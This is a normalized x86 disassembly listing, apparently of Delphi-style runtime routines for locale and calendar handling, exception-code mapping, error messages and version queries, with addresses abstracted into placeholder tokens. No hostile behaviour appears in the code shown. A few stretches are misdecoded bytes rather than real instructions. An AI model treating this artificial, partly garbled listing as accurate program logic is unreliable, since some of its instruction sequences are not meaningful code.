call sub_40a354
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a3e8
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a474
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a330
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4093d0
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a3e8
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a354
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a3e8
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a474
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a3e8
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a354
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40ab28
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a5f0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40415c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ab5c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a934
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40415c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ab90
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a5f0
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40ab5c
mov ebx eax
jmp r-xdata
mov eax esi
call sub_40415c
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40a934
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40ac1c
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_403f8c
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40ac68
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403ef0
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_403f8c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40acb4
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40acdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40ac68
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405c20
sub_40ad18
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40ae2b
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40acdc
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ef0
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40acdc
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403ef0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40acdc
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403ef0
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40acdc
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403ef0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ae32
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403ec0
retn
sub_40ae3c
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404094
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40ae78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40aedd
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404094
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408018
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aee4
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
inc ebx
sub_40aef0
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40af87
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40ac68
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408018
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40af8e
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40ae3c
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40ae78
call EnumCalendarInfoA
sub_40afa0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b16a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403e9c
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40ac68
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408018
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_40415c
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b171
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403ec0
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4085e8
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c058
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4043bc
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404164
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403ef0
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_4085e8
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404164
inc ebx
jmp r-xdata
mov eax esi
call sub_40415c
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4085e8
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404164
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404164
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404164
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404084
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404164
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404084
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404164
sub_40b1d4
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b1c8
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c1a8
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_40850c
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_40518c
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4030b4
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408b30
mov eax [ ebp - 0x4 ]
call sub_4084a8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_40435c
mov ebx eax
mov eax ebx
call sub_4084a8
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b35c
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b1d4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_40518c
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402a04
call sub_40289c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_4084a8
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b424
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ef0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b460
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b4ba
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408b70
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ef0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b4c1
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
add esp 0xfffffff0
call sub_403470
sub_40b4c1
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b4e0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405c20
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b51c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b588
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405c20
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408b70
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ef0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b58f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
add esp 0xfffffff0
call sub_403470
sub_40b58f
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b5b0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ef0
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40b624
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402910
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b51c
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b684
mov [ esi + 0xa0e0040 ] dh
push esp
inc ebp
js r-xdata
cmp edi 0x8bc35bff
rcl [ ebp - 0x75 ] 0xec
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
jo r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f34
jmp r-xdata
loopne r-xdata
push edx
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b79b
lea eax [ ebp - 0x20 ]
call sub_403e9c
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
je r-xdata
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b794
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
pop ebp
cld
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] bh
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_4038d8
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b424
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b624
mov edx eax
sub_40b6f8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40b794
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403f34
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b79b
lea eax [ ebp - 0x20 ]
call sub_403e9c
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40b7e8
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40b880
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40ba3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_40410c
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4083c0
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba42
lea eax [ ebp - 0x170 ]
call sub_403e9c
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403ec0
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_40ba4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bb07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40b7e8
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b424
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
push ebp
call sub_40b880
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb0e
lea eax [ ebp - 0x10 ]
call sub_403e9c
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
mov ebx eax
sub_40bb28
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bb18
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b868
mov eax [ rw-data ]
mov [ eax ] sub_40ba4c
mov eax sub_40b7b4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b7d0
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bbac
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403164
xor eax eax
mov [ rw-data ] eax
sub_40bc2c
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_40410c
sub_40bcbc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bd92
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403f34
lea eax [ ebp - 0x8 ]
call j_sub_404368#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40435c
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd99
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
mov eax ebx
call sub_402734
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bd75
